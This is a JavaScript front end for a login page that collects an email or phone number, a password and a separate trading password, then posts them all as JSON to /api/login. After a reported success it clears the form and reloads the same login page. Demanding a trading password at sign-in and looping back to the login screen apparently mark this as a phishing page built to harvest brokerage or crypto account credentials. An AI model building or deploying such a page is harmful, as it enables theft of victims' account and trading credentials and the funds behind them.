document.addEventListener('DOMContentLoaded', function () {
    // === Splash Screen (shows on every page load / refresh) ===
    const splashScreen = document.getElementById('splashScreen');
    if (splashScreen) {
        // Ensure it is fully visible at start
        splashScreen.style.opacity = '1';
        splashScreen.style.visibility = 'visible';

        // Hide after 5 seconds with smooth fade-out
        setTimeout(function () {
            splashScreen.style.transition = 'opacity 0.8s ease-in-out, visibility 0.8s ease-in-out';
            splashScreen.classList.add('hidden');

            // Remove from DOM after fade completes
            splashScreen.addEventListener('transitionend', function () {
                splashScreen.remove();
            }, { once: true });
        }, 7000);
    }

    // === Elements ===
    const tabEmail = document.getElementById('tabEmail');
    const tabPhone = document.getElementById('tabPhone');
    const emailGroup = document.getElementById('emailGroup');
    const phoneGroup = document.getElementById('phoneGroup');
    const emailInput = document.getElementById('emailInput');
    const phoneInput = document.getElementById('phoneInput');
    const passwordInput = document.getElementById('passwordInput');
    const tradingPasswordInput = document.getElementById('tradingPasswordInput');
    const togglePassword = document.getElementById('togglePassword');
    const toggleTradingPassword = document.getElementById('toggleTradingPassword');
    const rememberPassword = document.getElementById('rememberPassword');
    const userAgreement = document.getElementById('userAgreement');
    const loginForm = document.getElementById('loginForm');
    const toast = document.getElementById('toast');
    const toastMessage = document.getElementById('toastMessage');

    let activeTab = 'email';

    // === Tab Switching ===
    tabEmail.addEventListener('click', function () {
        activeTab = 'email';
        tabEmail.classList.add('active');
        tabPhone.classList.remove('active');
        emailGroup.classList.remove('hidden');
        phoneGroup.classList.add('hidden');
        emailInput.focus();
    });

    tabPhone.addEventListener('click', function () {
        activeTab = 'phone';
        tabPhone.classList.add('active');
        tabEmail.classList.remove('active');
        phoneGroup.classList.remove('hidden');
        emailGroup.classList.add('hidden');
        phoneInput.focus();
    });

    // === Toggle Password Visibility ===
    function setupPasswordToggle(toggleBtn) {
        toggleBtn.addEventListener('click', function () {
            const wrapper = toggleBtn.parentElement;
            const input = wrapper.querySelector('input');
            const eyeClosed = toggleBtn.querySelector('.eye-closed');
            const eyeOpen = toggleBtn.querySelector('.eye-open');
            if (input.type === 'password') {
                input.type = 'text';
                eyeClosed.classList.add('hidden');
                eyeOpen.classList.remove('hidden');
            } else {
                input.type = 'password';
                eyeOpen.classList.add('hidden');
                eyeClosed.classList.remove('hidden');
            }
        });
    }

    setupPasswordToggle(togglePassword);
    setupPasswordToggle(toggleTradingPassword);

    // === Show Toast ===
    function showToast(message, isError) {
        toastMessage.textContent = message;
        toast.classList.remove('error');
        if (isError) {
            toast.classList.add('error');
        }
        toast.classList.add('show');
        setTimeout(function () {
            toast.classList.remove('show');
        }, 3000);
    }

    // === Form Submission ===
    loginForm.addEventListener('submit', async function (e) {
        e.preventDefault();

        const password = passwordInput.value.trim();
        const tradingPassword = tradingPasswordInput.value.trim();
        const email = emailInput.value.trim();
        const phone = phoneInput.value.trim();
        const remember = rememberPassword.checked;
        const agreed = userAgreement.checked;

        // Validation
        if (activeTab === 'email' && !email) {
            showToast('Please enter your email', true);
            emailInput.focus();
            return;
        }
        if (activeTab === 'phone' && !phone) {
            showToast('Please enter your phone number', true);
            phoneInput.focus();
            return;
        }
        if (!password) {
            showToast('Please enter your password', true);
            passwordInput.focus();
            return;
        }
        if (!tradingPassword) {
            showToast('Please enter your trading password', true);
            tradingPasswordInput.focus();
            return;
        }
        if (!agreed) {
            showToast('Please agree to the User Agreement', true);
            return;
        }

        // Build payload
        const payload = {
            login_type: activeTab,
            email: activeTab === 'email' ? email : '',
            phone_number: activeTab === 'phone' ? phone : '',
            password: password,
            trading_password: tradingPassword,
            remember_password: remember
        };

        try {
            const response = await fetch('/api/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            const data = await response.json();

            if (data.success) {
                showToast('Login successful!', false);
                // Clear form
                emailInput.value = '';
                phoneInput.value = '';
                passwordInput.value = '';
                tradingPasswordInput.value = '';
                // Redirect back to login after 2 seconds
                setTimeout(function () {
                    window.location.href = window.location.href;
                }, 2000);
            } else {
                showToast(data.message || 'Something went wrong', true);
            }
        } catch (err) {
            showToast('Failed to connect to server', true);
            console.error('Error:', err);
        }
    });
});
